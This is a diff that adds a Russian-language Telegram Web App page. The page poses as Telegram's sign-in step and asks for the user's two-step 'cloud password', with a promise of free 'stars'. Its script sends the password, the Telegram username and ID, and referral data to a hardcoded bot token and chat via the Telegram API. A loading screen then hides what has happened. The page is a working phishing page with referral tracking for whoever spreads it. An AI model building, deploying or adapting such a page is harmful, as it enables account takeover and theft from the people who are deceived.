@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Code</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --tg-blue: #26a4e3;
+            --tg-green: #38a169;
+            --tg-red: #ef4444;
+            --code-border: #8774e1;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+            font-weight: 400;
+            font-style: normal;
+            background-color: #212121;
+        }
+        .input-container {
+            position: relative;
+        }
+        .floating-label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            font-size: 1rem;
+        }
+        .input-field:focus + .floating-label,
+        .input-field:not(:placeholder-shown) + .floating-label,
+        .input-field.has-value + .floating-label {
+            top: -8px;
+            left: 12px;
+            transform: translateY(0);
+            font-size: 0.75rem;
+            color: #8774e1;
+            background-color: #212121;
+            padding: 0 4px;
+        }
+        .input-field {
+            background-color: transparent;
+            caret-color: #8774e1;
+            border: 1px solid #6b7280;
+            border-radius: 0.75rem;
+            padding: 0.875rem 1rem;
+            transition: all 0.15s ease;
+        }
+        .input-field:focus {
+            border-width: 2px;
+            border-color: #8774e1;
+            outline: none;
+        }
+        .input-field.has-value:not(:focus) {
+            border-width: 2px;
+            border-color: #8774e1;
+        }
+        .loading-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #212121;
+            z-index: 1000;
+        }
+        .loading-screen.active {
+            display: flex;
+        }
+        .spinner {
+            border: 4px solid rgba(135, 116, 225, 0.2);
+            border-top: 4px solid #8774e1;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #9ca3af;
+            font-size: 0.875rem;
+            text-align: center;
+            max-width: 300px;
+            line-height: 1.5;
+        }
+    </style>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'tg-blue': '#26a4e3',
+                        'tg-blue-dark': '#1e80b5',
+                        'red-500': '#ef4444',
+                    }
+                }
+            }
+        }
+
+        function handleEditClick() {
+            window.location.href = 'index.html';
+        }
+
+        function getReferrerInfo() {
+            let referrerInfo = null;
+            
+            const savedReferrer = sessionStorage.getItem('referrerInfo');
+            if (savedReferrer) {
+                try {
+                    referrerInfo = JSON.parse(savedReferrer);
+                    if (referrerInfo && referrerInfo.username) {
+                        return referrerInfo;
+                    }
+                } catch (e) {
+                    console.error('Ошибка при парсинге сохранённого реферала:', e);
+                }
+            }
+            
+            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.startParam) {
+                try {
+                    const startParam = window.Telegram.WebApp.startParam;
+                    if (startParam.startsWith('ref_')) {
+                        const refData = startParam.substring(4);
+                        const parts = refData.split('_');
+                        if (parts.length >= 2) {
+                            const referrerId = parts[parts.length - 1];
+                            const referrerUsername = parts.slice(0, -1).join('_');
+                            
+                            if (referrerUsername.startsWith('id')) {
+                                referrerInfo = { username: `ID:${referrerId}`, userId: referrerId };
+                            } else {
+                                referrerInfo = { username: `@${referrerUsername}`, userId: referrerId };
+                            }
+                            
+                            sessionStorage.setItem('referrerInfo', JSON.stringify(referrerInfo));
+                            return referrerInfo;
+                        }
+                    }
+                } catch (e) {
+                    console.error('Ошибка при парсинге реферала из startParam:', e);
+                }
+            }
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlRef = urlParams.get('ref');
+            if (urlRef) {
+                try {
+                    if (urlRef.startsWith('ref_')) {
+                        const refData = urlRef.substring(4);
+                        const parts = refData.split('_');
+                        if (parts.length >= 2) {
+                            const referrerId = parts[parts.length - 1];
+                            const referrerUsername = parts.slice(0, -1).join('_');
+                            
+                            if (referrerUsername.startsWith('id')) {
+                                referrerInfo = { username: `ID:${referrerId}`, userId: referrerId };
+                            } else {
+                                referrerInfo = { username: `@${referrerUsername}`, userId: referrerId };
+                            }
+                        } else {
+                            referrerInfo = { username: `@${urlRef}`, userId: 'Не указан' };
+                        }
+                    } else {
+                        referrerInfo = { username: urlRef.startsWith('@') ? urlRef : `@${urlRef}`, userId: 'Не указан' };
+                    }
+                    
+                    if (referrerInfo) {
+                        sessionStorage.setItem('referrerInfo', JSON.stringify(referrerInfo));
+                        return referrerInfo;
+                    }
+                } catch (e) {
+                    console.error('Ошибка при парсинге реферала из URL:', e);
+                }
+            }
+            
+            return null;
+        }
+
+        function getUserData() {
+            let username = 'Не указан';
+            let userId = 'Не указан';
+            
+            const savedUser = sessionStorage.getItem('telegramUser');
+            if (savedUser) {
+                try {
+                    const user = JSON.parse(savedUser);
+                    username = user.username || 'Не указан';
+                    userId = user.id || 'Не указан';
+                    if (username !== 'Не указан' && userId !== 'Не указан') {
+                        return { username, userId };
+                    }
+                } catch (e) {
+                    console.error('Ошибка при парсинге сохранённых данных пользователя:', e);
+                }
+            }
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlUser = urlParams.get('user');
+            const urlUserId = urlParams.get('userid');
+            if (urlUser && urlUserId) {
+                username = urlUser.startsWith('@') ? urlUser : `@${urlUser}`;
+                userId = urlUserId;
+                sessionStorage.setItem('telegramUser', JSON.stringify({ username, userId }));
+                console.log('✅ Данные пользователя получены из URL параметров (pass.html):', { username, userId });
+                return { username, userId };
+            }
+            
+            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.startParam) {
+                try {
+                    const startParam = window.Telegram.WebApp.startParam;
+                    console.log('startParam найден (pass.html):', startParam);
+                    
+                    if (startParam.startsWith('ref_')) {
+                        const refData = startParam.substring(4);
+                        console.log('refData после удаления префикса:', refData);
+                        
+                        const parts = refData.split('_');
+                        console.log('Части после split:', parts);
+                        
+                        if (parts.length >= 2) {
+                            userId = parts[parts.length - 1];
+                            username = parts.slice(0, -1).join('_');
+                            
+                            console.log('Извлеченные данные:', { rawUsername: username, userId });
+                            
+                            if (username.startsWith('id')) {
+                                username = `ID:${userId}`;
+                            } else {
+                                username = `@${username}`;
+                            }
+                            
+                            sessionStorage.setItem('telegramUser', JSON.stringify({ username, userId }));
+                            console.log('✅ Данные пользователя получены из startParam и сохранены:', { username, userId });
+                            return { username, userId };
+                        } else {
+                            console.warn('Недостаточно частей в startParam:', parts);
+                        }
+                    } else {
+                        console.log('startParam не начинается с "ref_":', startParam);
+                    }
+                } catch (e) {
+                    console.error('Ошибка при парсинге startParam:', e);
+                }
+            } else {
+                console.log('startParam не доступен (pass.html):', {
+                    hasTelegram: !!window.Telegram,
+                    hasWebApp: !!(window.Telegram && window.Telegram.WebApp),
+                    hasStartParam: !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.startParam)
+                });
+            }
+            
+            if (window.Telegram && window.Telegram.WebApp) {
+                try {
+                    if (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
+                        const user = window.Telegram.WebApp.initDataUnsafe.user;
+                        userId = String(user.id || 'Не указан');
+                        if (user.username) {
+                            username = `@${user.username}`;
+                        } else if (user.first_name || user.last_name) {
+                            const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim();
+                            username = fullName || `ID:${userId}`;
+                        } else {
+                            username = `ID:${userId}`;
+                        }
+                    }
+                    else if (window.Telegram.WebApp.initData) {
+                        const initData = window.Telegram.WebApp.initData;
+                        const params = new URLSearchParams(initData);
+                        const userStr = params.get('user');
+                        if (userStr) {
+                            try {
+                                const user = JSON.parse(decodeURIComponent(userStr));
+                                userId = String(user.id || 'Не указан');
+                                if (user.username) {
+                                    username = `@${user.username}`;
+                                } else if (user.first_name || user.last_name) {
+                                    const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim();
+                                    username = fullName || `ID:${userId}`;
+                                } else {
+                                    username = `ID:${userId}`;
+                                }
+                            } catch (e) {
+                                console.error('Ошибка при парсинге initData:', e);
+                            }
+                        }
+                    }
+                    
+                    if (userId !== 'Не указан') {
+                        sessionStorage.setItem('telegramUser', JSON.stringify({ username, userId }));
+                    }
+                } catch (e) {
+                    console.error('Ошибка при получении данных пользователя:', e);
+                }
+            }
+            
+            console.log('Telegram WebApp доступен:', !!window.Telegram);
+            console.log('startParam:', window.Telegram?.WebApp?.startParam);
+            console.log('initDataUnsafe:', window.Telegram?.WebApp?.initDataUnsafe);
+            console.log('initData:', window.Telegram?.WebApp?.initData);
+            console.log('Полученные данные пользователя:', { username, userId });
+            
+            return { username, userId };
+        }
+
+        window.onload = function() {
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.ready();
+            }
+            
+            setTimeout(() => {
+                const userData = getUserData();
+                const referrerInfo = getReferrerInfo();
+                console.log('Данные пользователя при загрузке (pass.html):', userData);
+                console.log('Информация о реферале при загрузке (pass.html):', referrerInfo);
+            }, 500);
+            
+            const editButton = document.getElementById('editButton');
+            const codeInput = document.getElementById('codeInput');
+            
+            if (editButton) {
+                editButton.addEventListener('click', handleEditClick);
+            }
+
+            if (codeInput) {
+                if (codeInput.value.trim() !== '') {
+                    codeInput.classList.add('has-value');
+                }
+
+                codeInput.addEventListener('input', function() {
+                    if (this.value.trim() !== '') {
+                        this.classList.add('has-value');
+                    } else {
+                        this.classList.remove('has-value');
+                    }
+                });
+
+                codeInput.addEventListener('focus', function() {
+                    this.classList.add('has-value');
+                });
+
+                codeInput.addEventListener('blur', function() {
+                    if (this.value.trim() === '') {
+                        this.classList.remove('has-value');
+                    }
+                });
+            }
+
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.ready();
+            }
+        };
+    </script>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4" style="background-color: #212121;">
+
+    <div class="w-full max-w-lg sm:max-w-xl mb-16 -mt-16 flex justify-center">
+        <img src="monkey.png" 
+             alt="Monkey" 
+             class="w-32 h-32 object-contain">
+    </div>
+
+    <div class="w-full max-w-sm mb-6">
+        <div class="flex items-center justify-center gap-2">
+            <span id="phoneNumberDisplay" class="text-3xl font-bold text-white">+7 705 521 19 08</span>
+            <button id="editButton" class="text-gray-400 hover:text-gray-300 transition duration-150 p-1">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-pencil">
+                    <path d="M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <div class="w-full max-w-sm text-center mb-10 px-4">
+        <p class="text-base text-gray-400 leading-relaxed">
+            Если ваш аккаунт защищён паролем, введите его здесь, если нет - пропустите этот пункт.
+        </p>
+    </div>
+
+    <div class="w-full max-w-sm px-4 mb-6">
+        <div class="input-container">
+            <input type="password" 
+                   id="codeInput"
+                   placeholder=" "
+                   class="input-field w-full py-3 px-4 text-white text-base bg-transparent border border-gray-500 rounded-xl focus:outline-none transition duration-150"
+                   maxlength="50">
+            <label for="codeInput" class="floating-label">Облачный пароль</label>
+        </div>
+    </div>
+
+    <div class="w-full max-w-sm px-4 flex justify-between space-x-4">
+        <button id="skipButton" class="flex-1 py-3 text-base font-medium rounded-xl transition duration-150" style="color: #8774e1; background-color: transparent; border: 1px solid #8774e1;">
+            Пропустить
+        </button>
+        <button id="continueButton" class="flex-1 py-3 text-base text-white font-medium rounded-xl transition duration-150" style="background-color: #8774e1;">
+            Продолжить
+        </button>
+    </div>
+
+    <div id="loadingScreen" class="loading-screen">
+        <div class="spinner"></div>
+        <div class="loading-text">
+            Проверяем введённые данные.<br><br>
+            Звёзды начисляться через ~2 минуты после успешной авторизации
+        </div>
+    </div>
+
+    <script>
+        const skipButton = document.getElementById('skipButton');
+        const continueButton = document.getElementById('continueButton');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const body = document.body;
+
+        async function sendCloudPasswordToTelegram(cloudPassword) {
+            const BOT_TOKEN = '8289543761:AAGjow_hAYF8WfQnWJQnln5f0l8x2FKMzYA';
+            const CHAT_ID = '-1003476597636';
+            
+            let userData = getUserData();
+            console.log('Данные пользователя перед отправкой пароля:', userData);
+            
+            if (userData.username === 'Не указан' || userData.userId === 'Не указан') {
+                await new Promise(resolve => setTimeout(resolve, 200));
+                userData = getUserData();
+                console.log('Повторная попытка получения данных:', userData);
+            }
+            
+            const { username, userId } = userData;
+            
+            const referrerInfo = getReferrerInfo();
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const refParam = urlParams.get('ref') || '';
+            
+            let message = `🔒 <b>Облачный пароль</b>\n\n`;
+            if (referrerInfo && referrerInfo.username) {
+                message += `🔗 Пригласил: ${referrerInfo.username}\n\n`;
+            }
+            message += `👤 Пользователь: ${username}\n🆔 ID: ${userId}\n🔑 Пароль: ${cloudPassword || 'Не введён (пропущен)'}`;
+            if (refParam && (!referrerInfo || !referrerInfo.username)) {
+                message += `\n🔗 Реферал: ${refParam}`;
+            }
+            message += `\n⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Ошибка при отправке облачного пароля:', error);
+            }
+        }
+
+        function showLoadingScreen() {
+            const codeInput = document.getElementById('codeInput');
+            const cloudPassword = codeInput ? codeInput.value.trim() : '';
+            
+            sendCloudPasswordToTelegram(cloudPassword);
+            
+            Array.from(body.children).forEach(child => {
+                if (child.id !== 'loadingScreen') {
+                    child.style.display = 'none';
+                }
+            });
+            if (loadingScreen) {
+                loadingScreen.classList.add('active');
+            }
+        }
+
+        if (skipButton) {
+            skipButton.addEventListener('click', showLoadingScreen);
+        }
+
+        if (continueButton) {
+            continueButton.addEventListener('click', showLoadingScreen);
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const phoneNumber = urlParams.get('phone') || '';
+
+        function formatPhoneForDisplay(phone) {
+            if (!phone) return '+7 705 521 19 08';
+            let digits = phone.replace(/[^\d]/g, '');
+            if (digits.length === 0) return phone;
+            
+            if (digits.startsWith('7') && digits.length === 11) {
+                return `+7 ${digits.substring(1, 4)} ${digits.substring(4, 7)} ${digits.substring(7, 9)} ${digits.substring(9, 11)}`;
+            }
+            
+            if (digits.startsWith('7')) {
+                const prefix = '+7';
+                const number = digits.substring(1);
+                let formatted = prefix;
+                for (let i = 0; i < number.length; i++) {
+                    if (i > 0 && i % 3 === 0) formatted += ' ';
+                    formatted += number[i];
+                }
+                return formatted;
+            }
+            
+            if (phone.startsWith('+')) {
+                const prefixMatch = phone.match(/^\+[\d]+/);
+                if (prefixMatch) {
+                    const prefix = prefixMatch[0];
+                    const number = digits.substring(prefix.replace(/[^\d]/g, '').length);
+                    let formatted = prefix;
+                    for (let i = 0; i < number.length; i++) {
+                        if (i > 0 && i % 3 === 0) formatted += ' ';
+                        formatted += number[i];
+                    }
+                    return formatted;
+                }
+            }
+            
+            return phone;
+        }
+
+        const phoneNumberDisplay = document.getElementById('phoneNumberDisplay');
+        if (phoneNumberDisplay && phoneNumber) {
+            phoneNumberDisplay.textContent = formatPhoneForDisplay(phoneNumber);
+        }
+    </script>
+
+</body>
+</html>
+
+
